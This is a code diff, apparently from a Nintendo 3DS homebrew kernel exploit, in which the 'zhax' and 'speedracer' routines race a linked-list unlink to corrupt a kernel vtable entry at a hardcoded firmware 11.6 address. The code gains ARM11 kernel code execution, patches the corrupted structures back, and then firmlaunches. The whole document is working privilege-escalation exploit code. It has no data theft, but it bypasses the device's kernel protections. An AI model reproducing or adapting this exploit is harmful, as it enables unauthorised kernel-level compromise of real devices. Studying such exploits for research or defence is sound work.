@@ -22,6 +22,7 @@ vu32 stop_loop = 0;
 u8* bottom_fb = NULL;
 
 u32 corruption_target = 0xdff80000 + 0x6C68C + 0x24; // N3DS 11.6 (VA: 0xFFF2E68C + 0x24)
+u32 corruption_target_val = 0xFFF291D4; // bx lr
 
 vu32 val_objptr = 0;
 vu32 val_next = 0;
@@ -77,23 +78,39 @@ void ktest()
 	svcExitThread();
 }
 
-void hello()
+u32 kobj_buffer_kva, kobj_2_buffer_kva;
+u32 val_nextptr = 0xdeadbabe;
+
+int hello(u32* list_obj, u32* kobj)
 {
-	asm(
-		"clrex\n\t"
-		"cpsid i"
-	);
+	// fix vtable entry we hijacked
+	*(u32*)corruption_target = corruption_target_val;
 
+	// draw to screen a bit
 	memset(bottom_fb, 0xda, 240 * 320 * 3);
-
 	drawString(bottom_fb, "hello from arm11 kernel", 10, 10);
 	flush_dcache();
 
-	while(1);
-}
+	// fix up list object data to pretend unlinking didn't just happen
+	list_obj[2]++;
 
-u32 kobj_buffer_kva, kobj_2_buffer_kva;
-u32 val_nextptr = 0xdeadbabe;
+	// fix up previous node to point to the next one
+	*(vu32*)&test_buf_mirror[0x00] = 0x00000080;
+
+	// fix up next node to be nice and wholesome
+	*(vu32*)&test_buf_mirror[0x20] = val_nextptr;
+	*(vu32*)&test_buf_mirror[0x21] = 0xc0c0c0c0;
+	*(vu32*)&test_buf_mirror[0x22] = kobj_buffer_kva;
+
+	// draw some more
+	drawString(bottom_fb, "hello from arm11 kernel again", 10, 20);
+	// drawHex(bottom_fb, val_next, 10, 30);
+	flush_dcache();
+
+	// *(u32*) 0xdeadbabe = 0xbabe;
+
+	return 0;
+}
 
 void speedracer()
 {
@@ -141,23 +158,11 @@ void speedracer()
 	*(vu32*)&test_buf_mirror[0x21] = 0xdeadbabe; // will get overwritten with corruption_target so we ignore it
 	*(vu32*)&test_buf_mirror[0x22] = (u32)&hello; // pc
 
-	// // fourth node: skip and link to end of list
-	// *(vu32*)&test_buf_mirror[0x30] = val_nextptr;
-	// *(vu32*)&test_buf_mirror[0x31] = 0xc0c0c0c0;
-	// *(vu32*)&test_buf_mirror[0x32] = kobj_buffer_kva;
-
-    // while(*(vu32*)(0x10146000 + 0x80000000) != 0xFFE); // A
-
     printf("done\n");
 
 	svcSignalEvent(wait_handles[0]);
     
     printf("done again!\n");
-
-	// NS_LaunchApplicationFIRM(0x0004800542383841ll, 1);
-	// svcExitProcess();
-
-	while(1) svcSleepThread(1 * 1000 * 1000);
 }
 
 Result zhax()
@@ -238,15 +243,11 @@ Result zhax()
 
 		printf("hi\n");
 
-		// // firmlaunch
-		// NS_LaunchApplicationFIRM(0x0004800542383841ll, 1);
-		// // svcExitProcess();
-
 		speedracer();
 
-		while(1);
-
-		while(1) printf("done\n");
+		// firmlaunch
+		NS_LaunchApplicationFIRM(0x0004800542383841ll, 1);
+		svcExitProcess();
 	}
 
 	return 0;
